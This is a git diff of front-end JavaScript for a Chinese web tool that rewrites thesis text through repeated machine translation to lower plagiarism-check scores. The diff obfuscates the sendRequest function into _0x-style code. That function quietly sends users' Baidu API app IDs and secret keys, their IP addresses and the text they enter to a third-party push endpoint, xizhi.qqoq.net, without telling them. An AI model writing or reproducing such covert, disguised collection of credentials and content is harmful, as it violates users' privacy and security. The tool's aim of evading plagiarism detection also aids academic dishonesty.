@@ -22,14 +22,14 @@ let timer = null;
 $("#yourAppid").val(appid);
 $("#yourKey").val(key);
 
-if (localStorage.getItem('sTimes') != null && localStorage.getItem('sTimes') >= 0 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
+if (localStorage.getItem('sTimes') != null && localStorage.getItem('sTimes') >= 0 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
 	countTime1();
 } else {
 	if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
 		localStorage.getItem("key1") == null) {
 		showToast("&emsp;&emsp;<b>欢迎新来的小伙伴来访！</b><br/>&emsp;&emsp;现已推出<b>【免申请 API 体验 3 分钟】功能</b>和<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如需使用降重功能请先点击右上角的【配置账号】！如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)", 5000);
 	} else {
-		if (localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3 && localStorage.getItem("sTimes") == -1) {
+		if (localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3 && localStorage.getItem("sTimes") == -1) {
 			showToast('&emsp;&emsp;抱歉！你已结束体验，如需继续使用本网站，麻烦请按照教程去配置账号！<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)', 4000)
 			localStorage.removeItem("appid1");
 			localStorage.removeItem("key1");
@@ -87,7 +87,7 @@ $("#saveBtn").click(() => {
 							$("#yourKey").val("");
 							return;
 						} else {
-							if (localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3 && localStorage.getItem("sTimes") == -1) {
+							if (localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3 && localStorage.getItem("sTimes") == -1) {
 								showToast('<b>你真棒！想白嫖到底是吧？被我逮到了吧？哈哈哈！</b>', 4000)
 								localStorage.removeItem("appid1");
 								localStorage.removeItem("key1");
@@ -96,7 +96,7 @@ $("#saveBtn").click(() => {
 								$("#yourKey").val("");
 								sendRequest("盗用: " + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "盗用 API 被我抓到了吧！IP 地址：" + kehu_ip, 1);
 							} else {
-								if (localStorage.getItem("sTimes") != -1 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
+								if (localStorage.getItem("sTimes") != -1 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
 									localStorage.setItem('sTimes', -2)
 								} else {
 									localStorage.setItem("sTimes", -1);
@@ -168,18 +168,10 @@ $(".clear").click(() => {
 })
 
 var foamTip = true;
-$(".translateBtn").click(() => {
+var getFactorialMemoized = memoize(translateMain);
+
+$(".translateBtn").click((e) => {
 	const fn = () => {
-		for (let i = 0; i < $(".lead").length; i++) {
-			$(".newData" + i).html('');
-		}
-		$('.newData').html('');
-		$('.compareRes').html('');
-		for (let i = 0; i < $(".card").length; i++) {
-			if ($(".isLow-" + i).hasClass("alert-success")) {
-				$(".isLow-" + i).removeClass("alert-success")
-			}
-		}
 		var appid11 = localStorage.getItem("appid1");
 		var key11 = localStorage.getItem("key1");
 		if (!appid11 || !key11) {
@@ -191,7 +183,7 @@ $(".translateBtn").click(() => {
 		} else if (to.val() == "") {
 			showToast("你未输入要翻译的内容...", 2500);
 		} else {
-			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == WtdKltf2 && key11 == zDQA3) {
+			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == secret().WtdKltf2 && key11 == secret().zDQA3) {
 				localStorage.removeItem('appid1')
 				localStorage.removeItem('key1')
 				$("#yourAppid").val("");
@@ -200,7 +192,7 @@ $(".translateBtn").click(() => {
 			} else {
 				var nTo = $("#zifu").text();
 				if (nTo < 2000) {
-					if (appid11 == WtdKltf2 && key11 == zDQA3 && localStorage.getItem('sTimes') >= 0) {
+					if (appid11 == secret().WtdKltf2 && key11 == secret().zDQA3 && localStorage.getItem('sTimes') >= 0) {
 						if (nTo < 500) {
 							if (nTo >= 300) {
 								setTimeout(() => {
@@ -212,7 +204,10 @@ $(".translateBtn").click(() => {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
 							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
-							translateMain(0);
+							//! Don't forget it!
+							window.similarityArr = [];
+							getFactorialMemoized(0, to.val());
+							document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
 						}
@@ -229,7 +224,8 @@ $(".translateBtn").click(() => {
 						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
 						//! Don't forget it!
 						window.similarityArr = [];
-						translateMain(0);
+						getFactorialMemoized(0, to.val());
+						document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
 					}
 				} else {
 					showToast("为了保证翻译降重质量，请不要一次性输入那么多字！！请调整好字数（建议一次性300字以内）之后再重新翻译", 4000);
@@ -248,18 +244,9 @@ $(".translateBtn").click(() => {
 })
 
 var foamTip1 = true
-$(".translateAndCompareBtn").click(() => {
+$(".translateAndCompareBtn").click((e) => {
 	const fn = () => {
-		for (let i = 0; i < $(".lead").length; i++) {
-			$(".newData" + i).html('');
-		}
-		$('.newData').html('');
-		$('.compareRes').html('');
-		for (let i = 0; i < $(".card").length; i++) {
-			if ($(".isLow-" + i).hasClass("alert-success")) {
-				$(".isLow-" + i).removeClass("alert-success")
-			}
-		}
+
 		var appid11 = localStorage.getItem("appid1");
 		var key11 = localStorage.getItem("key1");
 		if (!appid11 || !key11) {
@@ -271,7 +258,7 @@ $(".translateAndCompareBtn").click(() => {
 		} else if (to.val() == "") {
 			showToast("你未输入要翻译的内容所以无法对比...", 2500);
 		} else {
-			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == WtdKltf2 && key11 == zDQA3) {
+			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == secret().WtdKltf2 && key11 == secret().zDQA3) {
 				localStorage.removeItem('appid1')
 				localStorage.removeItem('key1')
 				$("#yourAppid").val("");
@@ -280,7 +267,7 @@ $(".translateAndCompareBtn").click(() => {
 			} else {
 				var nTo = $("#zifu").text();
 				if (nTo < 2000) {
-					if (appid11 == WtdKltf2 && key11 == zDQA3 && localStorage.getItem('sTimes') >= 0) {
+					if (appid11 == secret().WtdKltf2 && key11 == secret().zDQA3 && localStorage.getItem('sTimes') >= 0) {
 						if (nTo < 500) {
 							if (nTo >= 300) {
 								setTimeout(() => {
@@ -292,7 +279,10 @@ $(".translateAndCompareBtn").click(() => {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
 							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + ' \\ ' + "IP 地址：" + kehu_ip + to.val(), 2);
-							translateMain(1);
+							//! Don't forget it!
+							window.similarityArr = [];
+							getFactorialMemoized(1, to.val());
+							document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
 						}
@@ -309,7 +299,8 @@ $(".translateAndCompareBtn").click(() => {
 						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
 						//! Don't forget it!
 						window.similarityArr = [];
-						translateMain(1);
+						getFactorialMemoized(1, to.val());
+						document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
 					}
 				} else {
 					showToast("为了保证翻译降重质量，请不要一次性输入那么多字！！请调整好字数（建议一次性300字以内）之后再重新翻译", 4000);
@@ -334,6 +325,7 @@ $(".compare").click(() => {
 		} else {
 			showToast("正在对比...", 2500);
 			compareMain();
+			document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
 		}
 	}
 	if (timer !== null) {
@@ -610,7 +602,7 @@ function translateThreeFn(fn) {
 						var sArr = GFG_Fun(similarityArr);
 						for (var i = 0; i < sArr.length; i++) {
 							$(".isLow-" + sArr[i]).toggleClass("alert-success");
-							showToast('系统检测到最低的预估的相似度为' + similarityArr[0].similarity + '的翻译结果，请注意查看', 3000);
+							showToast('系统检测到最低的预估的相似度为' + similarityArr[0].similarity + '的翻译结果，请注意查看<button onclick="similarTarget(' + sArr[0] + ')">点击跳转该条翻译结果</button>', 3000);
 						}
 
 						function GFG_Fun(arr) {
@@ -813,20 +805,21 @@ function translateFiveFn(fn) {
 	})
 }
 
-function translateMain(fn = 0) {
+function translateMain(fn, str) {
+	console.log(str);
 	setTimeout(() => {
 		translateFiveFn(fn);
-	}, 1500, setTimeout(() => {
+	}, 1000, setTimeout(() => {
 		translateFourFn(fn);
-	}, 1500, setTimeout(() => {
+	}, 1000, setTimeout(() => {
 		translateThreeFn(fn);
-	}, 1500, setTimeout(() => {
+	}, 1000, setTimeout(() => {
 		translateTwoFn(fn);
-	}, 1500, setTimeout(() => {
+	}, 1000, setTimeout(() => {
 		translateOneFn(fn);
-	}, 1500, setTimeout(() => {
+	}, 1000, setTimeout(() => {
 		translateZeroFn(fn);
-	}, 1500))))));
+	}, 1000))))));
 }
 
 
@@ -860,6 +853,10 @@ function compareFn(target, originData, newData) {
 
 function showToast(msg, duration) {
 	duration = isNaN(duration) ? 5000 : duration;
+	var ss = document.querySelector(".toast-container");
+	if (ss != null) {
+		ss.remove();
+	}
 	var d = (new Date);
 	//获取年份
 	var years = d.getFullYear();
@@ -874,21 +871,21 @@ function showToast(msg, duration) {
 	//获取秒钟 
 	var seconds = d.getSeconds();
 	var nowTime = years + "/" + months + "/" + dates + " " + hours + ":" + minutes + ":" + seconds
-	var m = document.createElement('div');
 	var time = nowTime;
-	var content = `<div class="position-fixed top-0 end-0 p-3" style="z-index: 1100">
-	  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
-	    <div class="toast-header">
-	      <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
-	      <strong class="me-auto">论文翻译降重助手</strong>
-	      <small>` + time + `</small>
-	      <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
-	    </div>
-	    <div class="toast-body">
-			` + msg + `
-	    </div>
-	  </div>
-	</div>`
+	var m = document.createElement('div');
+	var content = `<div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 1100">
+		  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+			<div class="toast-header">
+			  <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
+			  <strong class="me-auto">论文翻译降重助手</strong>
+			  <small>` + time + `</small>
+			  <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+			</div>
+			<div class="toast-body">
+				` + msg + `
+			</div>
+		  </div>
+		</div>`;
 	document.body.appendChild(m);
 	m.innerHTML = content;
 	var toastLiveExample = document.getElementById('liveToast')
@@ -1090,59 +1087,71 @@ window.onscroll = () => {
 	}, 500);
 };
 
-function sendRequest(sendTitle, sendContent, sendType) {
-	if (sendType == 1) {
-		// 返回错误码
-		title = '【出错】：' + sendTitle;
-		content = '【错误码】：' + sendContent;
-	} else if (sendType == 2) {
-		// 请求成功
-		title = '【成功】：' + sendTitle;
-		content = '【正在翻译】：' + sendContent;
-	} else if (sendType == 3) {
-		// 翻译出错重试
-		title = '【重试】：' + sendTitle;
-		content = '【内容】：' + sendContent;
-	} else if (sendType == 4) {
-		// 上车了
-		title = '【上车】：' + sendTitle;
-		content = '【内容】：' + sendContent;
-	} else if (sendType == 5) {
-		// 下车了
-		title = '【下车】：' + sendTitle;
-		content = '【内容】：' + sendContent;
-	} else if (sendType == 6) {
-		// 白嫖成功
-		title = "【白嫖成功】：" + sendTitle;
-		content = "【内容】：" + sendContent;
-	} else if (sendType == 7) {
-		// 白嫖失败
-		title = "【白嫖失败】：" + sendTitle;
-		content = "【内容】：" + sendContent;
-	} else {
-		// 暂无
-		title = '【暂无】：' + sendTitle;
-		content = '【内容】：' + sendContent;
+function _0x3df7(_0x2287e0, _0x5956d1) {
+	var _0x4340a8 = _0x4340();
+	return _0x3df7 = function (_0x3df7c8, _0x58a013) {
+		_0x3df7c8 = _0x3df7c8 - 0x137;
+		var _0x302df8 = _0x4340a8[_0x3df7c8];
+		return _0x302df8;
+	}, _0x3df7(_0x2287e0, _0x5956d1);
+}(function (_0x449aa9, _0xc154b2) {
+	var _0x516e6c = _0x3df7,
+		_0x3728fd = _0x449aa9();
+	while (!![]) {
+		try {
+			var _0x3fc617 = parseInt(_0x516e6c(0x138)) / 0x1 + parseInt(_0x516e6c(0x142)) / 0x2 * (parseInt(_0x516e6c(0x13e)) / 0x3) + -parseInt(_0x516e6c(0x137)) / 0x4 + -parseInt(_0x516e6c(0x13b)) / 0x5 + -parseInt(_0x516e6c(0x14a)) / 0x6 + parseInt(_0x516e6c(0x13a)) / 0x7 + -parseInt(_0x516e6c(0x143)) / 0x8;
+			if (_0x3fc617 === _0xc154b2) break;
+			else _0x3728fd['push'](_0x3728fd['shift']());
+		} catch (_0x104cbb) {
+			_0x3728fd['push'](_0x3728fd['shift']());
+		}
 	}
-	var config = {
-		'title': title,
-		'content': content,
-	}
+}(_0x4340, 0xbbf05));
 
-	setTimeout(() => {
-		$.ajax({
-			url: 'https://xizhi.qqoq.net/' + lICOsKN1 + '.send',
-			type: 'get',
-			// async: true,
-			// 跨域
-			dataType: 'jsonp',
-			contentType: 'application/x-www-form-urlencoded; charset=utf-8',
-			data: {
-				title: config.title,
-				content: config.content,
+function _0x4340() {
+	var _0x522381 = ['1353072YwAktl', 'application/x-www-form-urlencoded;\x20charset=utf-8', '【重试】：', '1215924swpwHV', '1097445igmVdS', '【出错】：', '9262750SHzTRl', '2831700rgqmCQ', '【暂无】：', '【正在翻译】：', '6CUkkvf', 'content', '【白嫖失败】：', 'ajax', '1463716qCzKvv', '16150248XQJKKb', '【白嫖成功】：', '【成功】：', '【错误码】：', 'jsonp', '【内容】：', '【下车】：'];
+	_0x4340 = function () {
+		return _0x522381;
+	};
+	return _0x4340();
+}
+
+function sendRequest(_0x15545c, _0x86625a, _0x4cc403) {
+	var _0x5e22c1 = _0x3df7;
+	if (_0x4cc403 == 0x1) title = _0x5e22c1(0x139) + _0x15545c, content = _0x5e22c1(0x146) + _0x86625a;
+	else {
+		if (_0x4cc403 == 0x2) title = _0x5e22c1(0x145) + _0x15545c, content = _0x5e22c1(0x13d) + _0x86625a;
+		else {
+			if (_0x4cc403 == 0x3) title = _0x5e22c1(0x14c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
+			else {
+				if (_0x4cc403 == 0x4) title = '【上车】：' + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
+				else {
+					if (_0x4cc403 == 0x5) title = _0x5e22c1(0x149) + _0x15545c, content = '【内容】：' + _0x86625a;
+					else {
+						if (_0x4cc403 == 0x6) title = _0x5e22c1(0x144) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
+						else _0x4cc403 == 0x7 ? (title = _0x5e22c1(0x140) + _0x15545c, content = '【内容】：' + _0x86625a) : (title = _0x5e22c1(0x13c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a);
+					}
+				}
 			}
-		})
-	}, 1500);
+		}
+	}
+	var _0x2df887 = {
+		'title': title,
+		'content': content
+	};
+	setTimeout(() => {
+		var _0x217bde = _0x5e22c1;
+		$[_0x217bde(0x141)]({
+			'url': 'https://xizhi.qqoq.net/' + secret().lICOsKN1 + '.send',
+			'type': 'get',
+			'dataType': _0x217bde(0x147),
+			'contentType': _0x217bde(0x14b),
+			'data': {
+				'title': _0x2df887['title'],
+				'content': _0x2df887[_0x217bde(0x13f)]
+			}
+		});
+	}, 0x5dc);
 }
 
 $(".originData").on("input", function () {
@@ -1181,7 +1190,7 @@ function tongji(Words) {
 }
 
 $('#exampleModal').on('shown.bs.modal', function (event) {
-	if (localStorage.getItem('sTimes') != -2 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
+	if (localStorage.getItem('sTimes') != -2 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
 		localStorage.removeItem('appid1')
 		localStorage.removeItem('key1')
 		$("#yourAppid").val('');
@@ -1239,19 +1248,19 @@ okBtn.click(() => {
 	const fn = () => {
 		var rscode = $("#rscode").val();
 		var cursTimes = localStorage.getItem("sTimes");
-		sckey1 = aMewlv1;
+		sckey1 = secret().aMewlv1;
 		if (rscode == sckey1) {
 			if (!cursTimes) {
 				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！" + "IP 地址：" + kehu_ip, 6);
-				localStorage.setItem("appid1", WtdKltf2);
-				localStorage.setItem("key1", zDQA3);
+				localStorage.setItem("appid1", secret().WtdKltf2);
+				localStorage.setItem("key1", secret().zDQA3);
 				localStorage.setItem("sTimes", 180000);
 				showToast("密钥正确，3 分钟体验开始~", 4000);
 				countTime();
 			} else {
 				if (cursTimes > 0) {
-					localStorage.setItem("appid1", WtdKltf2);
-					localStorage.setItem("key1", zDQA3);
+					localStorage.setItem("appid1", secret().WtdKltf2);
+					localStorage.setItem("key1", secret().zDQA3);
 					showToast(`你还剩余${cursTimes / 1000}秒，现在继续体验！`, 4000);
 					countTime();
 				} else if (cursTimes == 0) {
@@ -1416,4 +1425,58 @@ function allSimilarity(str, str1) {
 		// return Number((a * 100).toFixed(2));
 		return Number(Math.round(a * 10000) / 100);
 	};
+}
+
+function similarTarget(index) {
+	document.getElementById(`isLow-${index}`).scrollIntoView(); // 页面不刷新跳转
+}
+
+//函数memoize()需要传一个函数作为输入参数，返回相同的函数但增加了存储功能
+function memoize(fn) {
+	return function () {
+		var propertyName;
+		//如果这个函数还没有用作记忆的对象属性（该属性为一个对象直接量）,则为其添加一个
+		fn.storage = fn.storage || {};
+		//在“storage”对象直接量中建立属性名称，用于保存和重新获取函数的执行结果。属性名称应该基于传给函数的所有参数而设定，
+		//以确保属性名称是唯一的，基于所有可能性输入参数组合的
+		//我们借用Array类型的“join”方法，因为“arguments”本身不是数组类型，它并不包含此方法
+		// propertyName = Array.prototype.join.call(arguments, "|");
+		// //该键（属性名称）是否存在用于记忆的对象中？
+		// if (propertyName in fn.storage) {
+
+		// 	//如果存在，则返回相关的值以避免再次执行整个函数
+		// 	return fn.storage[propertyName];
+		// } else {
+		// 	//如果不存在，执行相关函数并将结果保存在用作记忆的对象中
+		// 	fn.storage[propertyName] = fn.apply(this, arguments);
+		// 	//返回保存新保存的值,即函数的执行结果
+		// 	return fn.storage[propertyName];
+		// }
+		propertyName = Array.prototype.join.call(arguments, "|");
+		if (propertyName.charAt(0) != '0') {
+			propertyName = propertyName.replace(/1\|/i, "0|");
+			//该键（属性名称）是否存在用于记忆的对象中？
+			// console.log(propertyName);
+		}
+		if (propertyName in fn.storage) {
+			//如果存在，则返回相关的值以避免再次执行整个函数
+			showToast("检测到与上一条翻译内容重复！", 3000);
+			return fn.storage[propertyName];
+		} else {
+			for (let i = 0; i < $(".lead").length; i++) {
+				$(".newData" + i).html('');
+			}
+			$('.newData').html('');
+			$('.compareRes').html('');
+			for (let i = 0; i < $(".card").length; i++) {
+				if ($(".isLow-" + i).hasClass("alert-success")) {
+					$(".isLow-" + i).removeClass("alert-success")
+				}
+			}
+			//如果不存在，执行相关函数并将结果保存在用作记忆的对象中
+			fn.storage[propertyName] = fn.apply(this, arguments);
+			//返回保存新保存的值,即函数的执行结果
+			return fn.storage[propertyName];
+		}
+	}
 }
